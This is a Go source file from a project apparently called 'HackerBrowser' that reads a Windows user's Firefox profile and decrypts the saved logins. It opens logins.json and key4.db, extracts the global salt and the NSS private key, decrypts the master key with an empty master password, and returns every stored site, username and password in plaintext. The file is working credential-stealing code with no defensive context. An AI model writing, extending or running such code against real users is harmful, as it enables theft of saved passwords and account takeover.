package core

import (
	"HackerBrowser/crypher"
	"bytes"
	"database/sql"
	"encoding/base64"
	"fmt"
	"github.com/tidwall/gjson"
	"io/ioutil"
	"os"
	"path/filepath"
)

const (
	firefoxprofile = `/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release`
	firefoxlgonjson = `logins.json`
	firefoxkey4db = `key4.db`
)

type FireFoxInit struct {
	ProfilePath string
	KeyPath string
}

type FireFoxTemp struct {
	Url string
	EncryptUserName []byte
	EncryptPassword []byte
}

type FireFoxData struct {
	Url string
	UserName string
	PassWord string
}

func (f *FireFoxInit)InitProfile(MainProfile string) string {
	profilepath, err := filepath.Glob(os.Getenv("USERPROFILE") + firefoxprofile)
	if err != nil {
		return ""
	}
	if MainProfile != ""{
		return MainProfile
	}else{
		return profilepath[0] + `/` + firefoxlgonjson
	}
}

func (f *FireFoxInit) InitKey(MainKey string) string{
	keyfilepath, err := filepath.Glob(os.Getenv("USERPROFILE") + firefoxprofile)
	if err != nil {
		return ""
	}
	if MainKey != ""{
		return MainKey
	}else{
		return keyfilepath[0] + `/` + firefoxkey4db
	}
}

func (c *FireFoxInit)ReturnCredentials(login string) ([]FireFoxTemp, error) {
	// 返回火狐浏览器的login凭证
	var FireFoxD []FireFoxTemp
	var EncryptUserName,EncryptPassword []byte
	file, err := ioutil.ReadFile(login) // 读取login.json文件中的内容
	if err != nil {
		fmt.Println(err)
		return []FireFoxTemp{}, err
	}
	// 获取到json格式的数据，尝试获取json文件中的数据并返回
	for _,value := range gjson.GetBytes(file,"logins").Array(){
		EncryptUserName, err = base64.StdEncoding.DecodeString(value.Get("encryptedUsername").String())
		if err != nil {
			EncryptUserName = []byte("")
		}
		EncryptPassword, err = base64.StdEncoding.DecodeString(value.Get("encryptedPassword").String())
		if err != nil {
			EncryptPassword = []byte("")
		}
		FireFoxD = append(FireFoxD,FireFoxTemp{
			Url: value.Get("hostname").String(),
			EncryptPassword: EncryptPassword,
			EncryptUserName: EncryptUserName,
		})
	}
	return FireFoxD,nil
}

func ReturnFireFoxDecryptkey(key string)(item1,item2,al1,al2 []byte,err error){
	var (
		keyDB *sql.DB
		pwdRows *sql.Rows
		nssRows *sql.Rows
	)
	// 打开存储key的数据库文件
	keyDB ,err = sql.Open("sqlite3",key)
	if err != nil {
		return nil,nil,nil,nil,err
	}
	defer func() {
		if err := keyDB.Close();err != nil {
			os.Exit(1)
		}
	}()
	// 查询pwd的数据
	pwdRows, err = keyDB.Query(`SELECT item1, item2 FROM metaData WHERE id = 'password'`)
	if err != nil {
		return nil,nil,nil,nil,err
	}
	defer func() {
		if err := pwdRows.Close(); err != nil {
			fmt.Println("can't find key in key4.db")
			os.Exit(1)
		}
	}()
	for pwdRows.Next(){
		if err := pwdRows.Scan(&item1,&item2);err != nil {
			continue
		}
	}
	// 查询nss的数据
	nssRows, err = keyDB.Query(`SELECT a11, a102 from nssPrivate`)
	defer func() {
		if err := nssRows.Close();err != nil {
			os.Exit(1)
		}
	}()
	for nssRows.Next(){
		if err := nssRows.Scan(&al1,&al2); err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
	}
	return item1,item2,al1,al2,nil
}

func (f *FireFoxInit)ReturnData()([]FireFoxData, error){
	var data FireFoxData
	var FireFoxReturnData []FireFoxData
	globalSalt,metaByte, nssAl1, nssAl2 ,err := ReturnFireFoxDecryptkey(f.KeyPath)
	if err != nil {
		return []FireFoxData{},err
	}
	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
	metaPBE, err := crypher.NewASN1PBE(metaByte)
	if err != nil {
		return []FireFoxData{}, err
	}
	var masterPwd []byte
	k, err := metaPBE.Decrypt(globalSalt,masterPwd)
	if err != nil {
		return []FireFoxData{}, err
	}
	if bytes.Contains(k,[]byte("password-check")){
		m:= bytes.Compare(nssAl2,keyLin)
		if m == 0{
			nssPBE, err := crypher.NewASN1PBE(nssAl1)
			if err != nil{
				return []FireFoxData{},err
			}
			finallykey, err := nssPBE.Decrypt(globalSalt,masterPwd)
			finallykey = finallykey[:24]
			if err != nil {
				return []FireFoxData{},err
			}
			allLogin, err := f.ReturnCredentials(f.ProfilePath)
			if err != nil {
				return []FireFoxData{},err
			}
			for _,value := range allLogin{
				userPBE, err := crypher.NewASN1PBE(value.EncryptUserName)
				if err != nil {
					continue
				}
				pwdPBE, err := crypher.NewASN1PBE(value.EncryptPassword)
				if err != nil {
					continue
				}
				user, err := userPBE.Decrypt(finallykey,masterPwd)
				if err != nil {
					continue
				}
				pwd, err := pwdPBE.Decrypt(finallykey,masterPwd)
				if err != nil {
					continue
				}
				data = FireFoxData{
					Url: value.Url,
					UserName: string(crypher.PKCS5UnPadding(user)),
					PassWord: string(crypher.PKCS5UnPadding(pwd)),
				}
				FireFoxReturnData = append(FireFoxReturnData,data)
			}
		}
	}
	return FireFoxReturnData,nil
}
